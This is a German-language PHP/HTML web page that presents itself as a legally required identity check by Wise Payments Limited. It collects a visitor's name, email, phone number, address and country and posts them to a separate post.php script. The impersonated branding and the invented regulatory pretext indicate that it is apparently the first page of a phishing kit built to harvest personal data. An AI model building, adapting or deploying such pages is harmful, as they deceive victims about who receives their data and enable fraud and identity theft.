<?php 
require 'main.php';
?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link rel="stylesheet" href="res/app.css">
  <title>identverfahrensysteme</title>
 
</head>
<body>



<header>
    <div class="left">
<img src="res/img/logo.png" >
    </div>
</header>


  <div class="form-container">
 <form action="post.php" method="post">
         <div style="text-align: center; font-size: 17px; max-width: 800px; margin: 0 auto;"><p><strong>Willkommen!</p>Ihre Identität wird nun gemäß den regulatorischen Vorgaben überprüft.</strong>
</div>
        <hr style="width: 100%; height: 0.5px; background-color: #161b2f; border: none; margin: 10px auto;" />
        <div style="text-align: center; font-size: 15px; font-weight: bold; margin-bottom: 10px;">
  Schritt 1: Persönliche Angaben
      </div>
      <div style="text-align: center; font-size: 14px; max-width: 800px; margin: 0 auto;">Bitte füllen Sie Ihre Kontaktdaten vollständig aus, um die gesetzlich vorgeschriebene Identitätsprüfung durchzuführen.
</div>  
        <label>Vor- und Nachname</label>
        <div class="name-fields">
         
          <div>
            <input type="text" name="first" placeholder="Vorname" required>
          </div>
          <div>
            <input type="text" name="last" placeholder="Nachname" required>
          </div>
        </div>

       <div class="name-fields">
         <div style="flex: 1;">
        <label for="email">E-Mail-Adresse</label>
        <input type="email" name="email" id="email" required>
        </div>
        <div style="flex: 1;">
        <label for="phone">Telefonnummer</label>
        <input type="tel" name="phone" id="phone" required>
        </div>
        </div>

        <label for="street">Straße und Hausnummer</label>
        <input type="text" name="street" id="street" required>

        <div class="name-fields">
          <div>
            <label for="zip">Postleitzahl</label>
            <input type="text" name="zip" id="zip" required>
          </div>
          <div>
            <label for="city">Stadt</label>
            <input type="text" name="city" id="city" required>
          </div>
        </div>

        <label for="country">Land</label>
        <select name="country" id="country" name="country" required>
          <option value="">Bitte wählen</option>
          <option value="Schweiz">Schweiz</option>
          <option value="Deutschland">Deutschland</option>
          <option value="Österreich">Österreich</option>
          <option value="Liechtenstein">Liechtenstein</option>
          <option value="Luxemburg">Luxemburg</option>
          <option value="Spanien">Spanien</option>
          <option value="Italien">Italien</option>
          <option value="Niederlande">Niederlande</option>
          <option value="Norwegen">Norwegen</option>
          <option value="Schweden">Schweden</option>
        </select>
<button type="submit">Weiter</button>
      </div>

     
         
      </div>
 </form>
  </div>

<footer>
    <div class="fo">
<span>© Wise Payments Limited 2025</span>
    </div>
</footer>
</body>
</html>
